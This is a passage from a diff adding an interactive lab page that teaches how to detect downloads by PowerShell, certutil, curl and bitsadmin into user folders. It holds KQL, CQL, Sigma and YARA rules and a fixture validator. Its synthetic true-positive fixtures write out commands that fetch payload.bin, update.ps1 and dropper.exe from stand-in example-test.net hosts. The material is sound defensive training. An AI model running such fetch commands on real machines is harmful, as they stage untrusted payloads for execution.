+    | where ProcessCommandLine has_any (@&quot;\Downloads\&quot;, @&quot;\Desktop\&quot;, @&quot;\AppData\Local\Temp\&quot;)
+    | where not(
+        InitiatingProcessFileName =~ &quot;winget.exe&quot;
+        and ProcessCommandLine has_any (ApprovedPackageDomains)
+    )
+    | project DeviceId, DeviceName, ProcessId, ProcTime=Timestamp,
+              Tool=FileName, Parent=InitiatingProcessFileName,
+              CommandLine=ProcessCommandLine;
+let Network =
+    DeviceNetworkEvents
+    | where InitiatingProcessFileName in~ (&quot;powershell.exe&quot;, &quot;pwsh.exe&quot;, &quot;certutil.exe&quot;, &quot;curl.exe&quot;, &quot;bitsadmin.exe&quot;)
+    | project DeviceId, ProcessId=InitiatingProcessId,
+              NetTime=Timestamp, Domain=RemoteUrl, RemoteIP;
+let Files =
+    DeviceFileEvents
+    | where ActionType in (&quot;FileCreated&quot;, &quot;FileRenamed&quot;)
+    | extend TargetPath=strcat(FolderPath, @&quot;\&quot;, FileName)
+    | where TargetPath matches regex @&quot;(?i)\\Users\\[^\\]+\\(Downloads|Desktop|AppData\\Local\\Temp)\\&quot;
+    | project DeviceId, ProcessId=InitiatingProcessId,
+              FileTime=Timestamp, TargetPath, SHA256;
+Downloaders
+| join kind=inner Network on DeviceId, ProcessId
+| join kind=inner Files on DeviceId, ProcessId
+| where NetTime between (ProcTime .. ProcTime + 5m)
+| where FileTime between (ProcTime .. ProcTime + 5m)
+| project ProcTime, DeviceName, Tool, Parent, Domain, RemoteIP,
+          TargetPath, SHA256, CommandLine
+| order by ProcTime desc</code></pre></div><div class="hidden-rule" id="finalCql"><pre><code>#event_simpleName=ProcessRollup2
+| in(field=&quot;FileName&quot;, values=[&quot;powershell.exe&quot;, &quot;pwsh.exe&quot;, &quot;certutil.exe&quot;, &quot;curl.exe&quot;, &quot;bitsadmin.exe&quot;], ignoreCase=true)
+| CommandLine=/https?:\/\//i
+| CommandLine=/\\Users\\[^\\]+\\(Downloads|Desktop|AppData\\Local\\Temp)\\/i
+| not(ParentBaseFileName=&quot;winget.exe&quot; and CommandLine=/https?:\/\/packages\.corp\.example\//i)
+| regex(&quot;(?i)(?&lt;DownloadUrl&gt;https?://[^\\s\&quot;&#x27;]+)&quot;, field=CommandLine)
+| table([@timestamp, ComputerName, UserName, ParentBaseFileName,
+         FileName, DownloadUrl, CommandLine])</code></pre></div><div class="hidden-rule" id="finalSigma"><pre><code>title: Script or Transfer Tool Downloads to a User-Writable Directory
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_tools:
+    Image|endswith:
+      - &#x27;\powershell.exe&#x27;
+      - &#x27;\pwsh.exe&#x27;
+      - &#x27;\certutil.exe&#x27;
+      - &#x27;\curl.exe&#x27;
+      - &#x27;\bitsadmin.exe&#x27;
+  selection_url:
+    CommandLine|contains:
+      - &#x27;http://&#x27;
+      - &#x27;https://&#x27;
+  selection_user_path:
+    CommandLine|contains:
+      - &#x27;\Downloads\&#x27;
+      - &#x27;\Desktop\&#x27;
+      - &#x27;\AppData\Local\Temp\&#x27;
+  filter_approved_package:
+    ParentImage|endswith: &#x27;\winget.exe&#x27;
+    CommandLine|contains: &#x27;https://packages.corp.example/&#x27;
+  condition: selection_tools and selection_url and selection_user_path and not filter_approved_package
+falsepositives:
+  - Package managers using an approved corporate repository
+  - Browser helpers that hand work to a command-line tool
+  - Enterprise installers with temporary staging paths
+  - Managed update agents using PowerShell or curl
+level: medium</code></pre></div><div class="hidden-rule" id="finalYara"><pre><code>rule Week3_Synthetic_Download_Test
+{
+  meta:
+    description = &quot;Matches only the harmless Week 3 training sample&quot;
+    purpose = &quot;training&quot;
+  strings:
+    $marker = &quot;WEEK3_LAB_SYNTHETIC_DOWNLOAD&quot; ascii
+    $domain = &quot;files.example-test.net&quot; ascii
+  condition:
+    all of them
+}</code></pre></div></article>
+ <article class="card"><h3>Fixture validator</h3><p>Run the same browser detector against all eight labels.</p><button class="answer-btn" onclick="runValidation()">Run fixture validation</button><div class="result" id="validationResult">Not run in this browser yet.</div></article>
+ <article class="card"><h3>Validation record</h3><div class="validator-grid"><div class="metric"><strong>8/8</strong><span>fixture decisions passed</span></div><div class="metric"><strong>4/4</strong><span>TPs matched</span></div><div class="metric"><strong>4/4</strong><span>TNs stayed quiet</span></div></div><p class="compact"><b>Executed while building:</b> browser-equivalent fixture logic, Python join, Sigma YAML parse, and HTML/JavaScript checks.</p><p class="compact" id="toolValidationText"><b>Tool status:</b> loading verified execution record…</p><p class="compact"><b>Not executed:</b> KQL and CrowdStrike CQL require their product consoles and tenant field maps.</p></article>
+ <article class="card full"><h3>Analyst notes and handoff</h3><p><b>Likely false positives:</b> package managers, browser helpers, enterprise installers, and update agents. A good handoff includes the process tree, full command line, URL/domain, remote IP, destination, SHA-256, signer, initiating user, device role, and the reason an allowlist did or did not apply.</p><div class="callout">Detection is a review signal. A download to a user path can be risky, but context decides whether it is malicious.</div></article>
+</div></section>
+
+<nav class="nav-footer" aria-label="Lab pages"><button class="nav-btn" id="prevBtn" onclick="go(current-1)">← Previous</button><div class="dots" id="dots"></div><button class="nav-btn" id="nextBtn" onclick="go(current+1)">Next →</button></nav>
+<div class="status-bar">Keyboard: use ← and → to change pages. Theme and current page are saved in this browser. All fixtures, domains, IP addresses, hashes, users, and device names are synthetic training data.</div>
+</main>
+<script>
+const events = [{"event_number":1,"timestamp":"2026-11-15T08:30:12Z","device":"FIN-WS-014","user":"CORP\\maya","process_id":101,"parent_image":"C:\\Windows\\explorer.exe","tool":"powershell.exe","command_line":"powershell.exe -NoProfile -Command Invoke-WebRequest https://files.example-test.net/payload.bin -OutFile C:\\Users\\maya\\AppData\\Local\\Temp\\payload.bin","url":"https://files.example-test.net/payload.bin","domain":"files.example-test.net","remote_ip":"203.0.113.10","target_path":"C:\\Users\\maya\\AppData\\Local\\Temp\\payload.bin","sha256":"307037dbd22d1ad4544d491288c7f87442b23acd3133fcc48cb89f1ed26059d8","expected_match":true,"label":"True positive","reason":"PowerShell retrieves a file into the user's Temp directory."},{"event_number":2,"timestamp":"2026-11-15T08:42:05Z","device":"HR-LT-022","user":"CORP\\arun","process_id":202,"parent_image":"C:\\Windows\\System32\\cmd.exe","tool":"certutil.exe","command_line":"certutil.exe -urlcache -split -f https://cdn.example-test.net/tools/agent.dat C:\\Users\\arun\\Downloads\\agent.dat","url":"https://cdn.example-test.net/tools/agent.dat","domain":"cdn.example-test.net","remote_ip":"203.0.113.20","target_path":"C:\\Users\\arun\\Downloads\\agent.dat","sha256":"b3cb1105b4a7a4989c69068a65f86c04a0118d90f1d68eb0cc6d8ebceb014d0a","expected_match":true,"label":"True positive","reason":"certutil downloads a file into the user's Downloads directory."},{"event_number":3,"timestamp":"2026-11-15T09:03:44Z","device":"MKT-WS-008","user":"CORP\\neha","process_id":303,"parent_image":"C:\\Windows\\explorer.exe","tool":"curl.exe","command_line":"curl.exe --output C:\\Users\\neha\\AppData\\Local\\Temp\\update.ps1 https://download.example-test.net/update.ps1","url":"https://download.example-test.net/update.ps1","domain":"download.example-test.net","remote_ip":"203.0.113.30","target_path":"C:\\Users\\neha\\AppData\\Local\\Temp\\update.ps1","sha256":"e8fa6b019331803d39a120ace10113aeeaae5e3130eb5e6353ddde1621cb3b05","expected_match":true,"label":"True positive","reason":"curl writes a retrieved PowerShell script to the user's Temp directory."},{"event_number":4,"timestamp":"2026-11-15T09:21:19Z","device":"OPS-LT-019","user":"CORP\\vikram","process_id":404,"parent_image":"C:\\Windows\\System32\\cmd.exe","tool":"bitsadmin.exe","command_line":"bitsadmin.exe /transfer w3 https://assets.example-test.net/dropper.exe C:\\Users\\vikram\\Desktop\\dropper.exe","url":"https://assets.example-test.net/dropper.exe","domain":"assets.example-test.net","remote_ip":"203.0.113.40","target_path":"C:\\Users\\vikram\\Desktop\\dropper.exe","sha256":"097181fa009440e9964c87f80a6d372f0e279c6597b7a8181b610a2933163afe","expected_match":true,"label":"True positive","reason":"bitsadmin transfers an executable to the user's Desktop."},{"event_number":5,"timestamp":"2026-11-15T10:02:31Z","device":"IT-AUTO-03","user":"CORP\\maya","process_id":505,"parent_image":"C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller\\winget.exe","tool":"powershell.exe","command_line":"powershell.exe -Command Invoke-WebRequest https://packages.corp.example/approved-agent.msi -OutFile C:\\Users\\maya\\AppData\\Local\\Temp\\approved-agent.msi","url":"https://packages.corp.example/approved-agent.msi","domain":"packages.corp.example","remote_ip":"10.20.30.40","target_path":"C:\\Users\\maya\\AppData\\Local\\Temp\\approved-agent.msi","sha256":"18c4d94eb66e512a01f208c7c2d29e92509bc5e39db9fc5b0f60efbd59e1df74","expected_match":false,"label":"Benign negative","reason":"Exact approved winget parent plus corporate package domain is tuned out."},{"event_number":6,"timestamp":"2026-11-15T10:18:17Z","device":"SALES-LT-011","user":"CORP\\lee","process_id":606,"parent_image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","tool":"chrome.exe","command_line":"chrome.exe --type=utility --utility-sub-type=network.mojom.NetworkService","url":"https://downloads.vendor.example/guide.pdf","domain":"downloads.vendor.example","remote_ip":"198.51.100.60","target_path":"C:\\Users\\lee\\Downloads\\guide.pdf","sha256":"faa952bff539e84461b7f276f98af1e94e20541b12f207e6392d4e85456d0072","expected_match":false,"label":"Benign negative","reason":"A browser helper downloads a document; it is not one of the four script or transfer tools."},{"event_number":7,"timestamp":"2026-11-15T10:35:50Z","device":"ENG-WS-031","user":"SYSTEM","process_id":707,"parent_image":"C:\\Windows\\System32\\services.exe","tool":"ContosoDeploy.exe","command_line":"ContosoDeploy.exe /install https://install.corp.example/client.msi","url":"https://install.corp.example/client.msi","domain":"install.corp.example","remote_ip":"10.20.30.50","target_path":"C:\\ProgramData\\Contoso\\Cache\\client.msi","sha256":"e719b83569996fd5c55d17a802c3084d0577ef5801b6333ebde0896a5e17877a","expected_match":false,"label":"Benign negative","reason":"An enterprise installer writes to ProgramData and is not a selected download tool."},{"event_number":8,"timestamp":"2026-11-15T11:00:03Z","device":"FIN-WS-014","user":"SYSTEM","process_id":808,"parent_image":"C:\\Windows\\System32\\services.exe","tool":"ContosoUpdateAgent.exe","command_line":"ContosoUpdateAgent.exe --fetch https://updates.corp.example/patch.cab","url":"https://updates.corp.example/patch.cab","domain":"updates.corp.example","remote_ip":"10.20.30.60","target_path":"C:\\ProgramData\\Contoso\\Updates\\patch.cab","sha256":"c9c397cdf4c14ede347580007abf90ade017c04904f6041e965a9428a03b09c3","expected_match":false,"label":"Benign negative","reason":"A managed update agent writes to its ProgramData cache, not a user-writable folder."}];
+const processRecords = [{"timestamp":"2026-11-15T08:30:12Z","device":"FIN-WS-014","user":"CORP\\maya","process_id":101,"parent_image":"C:\\Windows\\explorer.exe","tool":"powershell.exe","command_line":"powershell.exe -NoProfile -Command Invoke-WebRequest https://files.example-test.net/payload.bin -OutFile C:\\Users\\maya\\AppData\\Local\\Temp\\payload.bin","url":"https://files.example-test.net/payload.bin","domain":"files.example-test.net"},{"timestamp":"2026-11-15T08:42:05Z","device":"HR-LT-022","user":"CORP\\arun","process_id":202,"parent_image":"C:\\Windows\\System32\\cmd.exe","tool":"certutil.exe","command_line":"certutil.exe -urlcache -split -f https://cdn.example-test.net/tools/agent.dat C:\\Users\\arun\\Downloads\\agent.dat","url":"https://cdn.example-test.net/tools/agent.dat","domain":"cdn.example-test.net"},{"timestamp":"2026-11-15T09:03:44Z","device":"MKT-WS-008","user":"CORP\\neha","process_id":303,"parent_image":"C:\\Windows\\explorer.exe","tool":"curl.exe","command_line":"curl.exe --output C:\\Users\\neha\\AppData\\Local\\Temp\\update.ps1 https://download.example-test.net/update.ps1","url":"https://download.example-test.net/update.ps1","domain":"download.example-test.net"},{"timestamp":"2026-11-15T09:21:19Z","device":"OPS-LT-019","user":"CORP\\vikram","process_id":404,"parent_image":"C:\\Windows\\System32\\cmd.exe","tool":"bitsadmin.exe","command_line":"bitsadmin.exe /transfer w3 https://assets.example-test.net/dropper.exe C:\\Users\\vikram\\Desktop\\dropper.exe","url":"https://assets.example-test.net/dropper.exe","domain":"assets.example-test.net"},{"timestamp":"2026-11-15T10:02:31Z","device":"IT-AUTO-03","user":"CORP\\maya","process_id":505,"parent_image":"C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller\\winget.exe","tool":"powershell.exe","command_line":"powershell.exe -Command Invoke-WebRequest https://packages.corp.example/approved-agent.msi -OutFile C:\\Users\\maya\\AppData\\Local\\Temp\\approved-agent.msi","url":"https://packages.corp.example/approved-agent.msi","domain":"packages.corp.example"},{"timestamp":"2026-11-15T10:18:17Z","device":"SALES-LT-011","user":"CORP\\lee","process_id":606,"parent_image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","tool":"chrome.exe","command_line":"chrome.exe --type=utility --utility-sub-type=network.mojom.NetworkService","url":"https://downloads.vendor.example/guide.pdf","domain":"downloads.vendor.example"},{"timestamp":"2026-11-15T10:35:50Z","device":"ENG-WS-031","user":"SYSTEM","process_id":707,"parent_image":"C:\\Windows\\System32\\services.exe","tool":"ContosoDeploy.exe","command_line":"ContosoDeploy.exe /install https://install.corp.example/client.msi","url":"https://install.corp.example/client.msi","domain":"install.corp.example"},{"timestamp":"2026-11-15T11:00:03Z","device":"FIN-WS-014","user":"SYSTEM","process_id":808,"parent_image":"C:\\Windows\\System32\\services.exe","tool":"ContosoUpdateAgent.exe","command_line":"ContosoUpdateAgent.exe --fetch https://updates.corp.example/patch.cab","url":"https://updates.corp.example/patch.cab","domain":"updates.corp.example"}];
+const fileRecords = [{"timestamp":"2026-11-15T08:30:12Z","device":"FIN-WS-014","process_id":101,"target_path":"C:\\Users\\maya\\AppData\\Local\\Temp\\payload.bin","sha256":"307037dbd22d1ad4544d491288c7f87442b23acd3133fcc48cb89f1ed26059d8"},{"timestamp":"2026-11-15T08:42:05Z","device":"HR-LT-022","process_id":202,"target_path":"C:\\Users\\arun\\Downloads\\agent.dat","sha256":"b3cb1105b4a7a4989c69068a65f86c04a0118d90f1d68eb0cc6d8ebceb014d0a"},{"timestamp":"2026-11-15T09:03:44Z","device":"MKT-WS-008","process_id":303,"target_path":"C:\\Users\\neha\\AppData\\Local\\Temp\\update.ps1","sha256":"e8fa6b019331803d39a120ace10113aeeaae5e3130eb5e6353ddde1621cb3b05"},{"timestamp":"2026-11-15T09:21:19Z","device":"OPS-LT-019","process_id":404,"target_path":"C:\\Users\\vikram\\Desktop\\dropper.exe","sha256":"097181fa009440e9964c87f80a6d372f0e279c6597b7a8181b610a2933163afe"},{"timestamp":"2026-11-15T10:02:31Z","device":"IT-AUTO-03","process_id":505,"target_path":"C:\\Users\\maya\\AppData\\Local\\Temp\\approved-agent.msi","sha256":"18c4d94eb66e512a01f208c7c2d29e92509bc5e39db9fc5b0f60efbd59e1df74"},{"timestamp":"2026-11-15T10:18:17Z","device":"SALES-LT-011","process_id":606,"target_path":"C:\\Users\\lee\\Downloads\\guide.pdf","sha256":"faa952bff539e84461b7f276f98af1e94e20541b12f207e6392d4e85456d0072"},{"timestamp":"2026-11-15T10:35:50Z","device":"ENG-WS-031","process_id":707,"target_path":"C:\\ProgramData\\Contoso\\Cache\\client.msi","sha256":"e719b83569996fd5c55d17a802c3084d0577ef5801b6333ebde0896a5e17877a"},{"timestamp":"2026-11-15T11:00:03Z","device":"FIN-WS-014","process_id":808,"target_path":"C:\\ProgramData\\Contoso\\Updates\\patch.cab","sha256":"c9c397cdf4c14ede347580007abf90ade017c04904f6041e965a9428a03b09c3"}];
+const validationRecord = "Python join executed successfully (process IDs 101, 202, 303, 404); fixture logic passed 8/8; Sigma YAML parsed with no id or status; HTML and JavaScript syntax passed. Go was not executed because the Go toolchain is unavailable. YARA was not executed because the YARA CLI is unavailable; its source was inspected only.";
+const tools = new Set(['powershell.exe','pwsh.exe','certutil.exe','curl.exe','bitsadmin.exe']);
+const base = p => p.replaceAll('\\','/').split('/').pop().toLowerCase();
+function isUserWritable(path){const p=path.toLowerCase();return p.includes('\\users\\')&&(p.includes('\\downloads\\')||p.includes('\\desktop\\')||p.includes('\\appdata\\local\\temp\\'))}
+function detect(e){const approved=base(e.parent_image)==='winget.exe'&&e.domain.toLowerCase()==='packages.corp.example';return tools.has(e.tool.toLowerCase())&&/^https?:\/\//i.test(e.url)&&isUserWritable(e.target_path)&&!approved}
+let current=1;
+function go(n){current=Math.min(8,Math.max(1,n));document.querySelectorAll('.page').forEach(p=>p.classList.toggle('active',+p.dataset.page===current));document.querySelectorAll('.dot').forEach((d,i)=>d.classList.toggle('active',i+1===current));document.getElementById('progress').style.width=(current/8*100)+'%';document.getElementById('prevBtn').disabled=current===1;document.getElementById('nextBtn').disabled=current===8;window.scrollTo({top:0,behavior:'smooth'});localStorage.setItem('week3Page',current)}
+function toggle(id){document.getElementById(id).classList.toggle('open')}
+async function copyFrom(id,btn){const text=document.getElementById(id).textContent;try{await navigator.clipboard.writeText(text)}catch(_){const area=document.createElement('textarea');area.value=text;document.body.appendChild(area);area.select();document.execCommand('copy');area.remove()}const old=btn.textContent;btn.textContent='Copied';setTimeout(()=>btn.textContent=old,1000)}
+function shortPath(path){return path.replace(/^.*\\/,'')}
+function renderEvents(){document.getElementById('eventsTable').innerHTML=events.map(e=>`<tr><td><b>${e.event_number}</b></td><td>${e.timestamp.replace('T','<br>')}<br><span style="color:var(--muted)">${e.device}</span></td><td><b>${e.tool}</b><br><span style="color:var(--muted)">PID ${e.process_id}</span></td><td>${e.domain}</td><td>${e.target_path}</td><td><span class="tag ${e.expected_match?'tp':'tn'}">${e.expected_match?'TP':'TN'}</span></td><td>${e.reason}</td></tr>`).join('');document.getElementById('eventPicker').innerHTML=events.map((e,i)=>`<button class="small-btn" aria-pressed="${i===0}" onclick="showEvent(${i},this)">Event ${e.event_number}</button>`).join('');document.getElementById('rawJsonCode').textContent=events.map(e=>JSON.stringify(e)).join('\n');document.getElementById('processJsonCode').textContent=processRecords.map(e=>JSON.stringify(e)).join('\n');document.getElementById('fileJsonCode').textContent=fileRecords.map(e=>JSON.stringify(e)).join('\n');document.getElementById('capstoneTable').innerHTML=events.filter(detect).map(e=>`<tr><td><b>${e.tool}</b><br>PID ${e.process_id}</td><td>${e.url}<br><span style="color:var(--muted)">${e.domain}</span></td><td>${e.target_path}</td><td class="hash">${e.sha256}</td></tr>`).join('');showEvent(0,document.querySelector('#eventPicker button'))}
+function showEvent(i,btn){document.querySelectorAll('#eventPicker button').forEach(b=>b.setAttribute('aria-pressed','false'));if(btn)btn.setAttribute('aria-pressed','true');const e=events[i];document.getElementById('flowTool').textContent=e.tool;document.getElementById('flowCommand').textContent=`PID ${e.process_id} starts the retrieval`;document.getElementById('flowDomain').textContent=e.domain;document.getElementById('flowIP').textContent=e.remote_ip;document.getElementById('flowFile').textContent=shortPath(e.target_path);document.getElementById('eventDetail').innerHTML=`<div class="detail-grid"><div class="detail-item"><small>Process</small><b>${e.tool}</b><br>PID ${e.process_id}</div><div class="detail-item"><small>Network</small><b>${e.domain}</b><br>${e.remote_ip}</div><div class="detail-item"><small>File</small><b>${e.target_path}</b></div><div class="detail-item"><small>Expected</small><b style="color:${e.expected_match?'var(--green)':'var(--blue)'}">${e.label}</b></div></div><p><b>Command:</b> <code>${e.command_line}</code></p><p><b>SHA-256:</b> <span class="hash">${e.sha256}</span></p><p>${e.reason}</p>`}
+function runValidation(){const rows=events.map(e=>detect(e)===e.expected_match);const passed=rows.filter(Boolean).length;const tp=events.filter(e=>detect(e)&&e.expected_match).length;const tn=events.filter(e=>!detect(e)&&!e.expected_match).length;const el=document.getElementById('validationResult');el.className='result '+(passed===events.length?'pass':'fail');el.innerHTML=`<b>${passed}/${events.length} decisions passed</b><br>${tp} true positives matched · ${tn} benign negatives stayed quiet`}
+function showRule(id,btn){document.querySelectorAll('.hidden-rule').forEach(x=>x.classList.remove('open'));document.querySelectorAll('.rule-picker button').forEach(x=>x.setAttribute('aria-pressed','false'));document.getElementById(id).classList.add('open');btn.setAttribute('aria-pressed','true')}
+document.getElementById('dots').innerHTML=Array.from({length:8},(_,i)=>`<button class="dot" onclick="go(${i+1})" aria-label="Page ${i+1}">${i+1}</button>`).join('');
+document.getElementById('themeBtn').onclick=()=>{const light=document.documentElement.dataset.theme==='light';document.documentElement.dataset.theme=light?'dark':'light';document.getElementById('themeBtn').textContent=light?'Light':'Dark';localStorage.setItem('week3Theme',light?'dark':'light')};
+let large=localStorage.getItem('week3Large')==='true';function applySize(){document.body.style.fontSize=large?'18px':'16px';document.getElementById('textBtn').textContent=large?'A−':'A+'}document.getElementById('textBtn').onclick=()=>{large=!large;applySize();localStorage.setItem('week3Large',large)};
+document.addEventListener('keydown',e=>{if(e.key==='ArrowRight')go(current+1);if(e.key==='ArrowLeft')go(current-1)});
+if(localStorage.getItem('week3Theme')==='light'){document.documentElement.dataset.theme='light';document.getElementById('themeBtn').textContent='Dark'}
+document.getElementById('toolValidationText').innerHTML='<b>Tool status:</b> '+validationRecord;
+applySize();renderEvents();go(+(localStorage.getItem('week3Page')||1));
+</script>
+</body>
+</html>
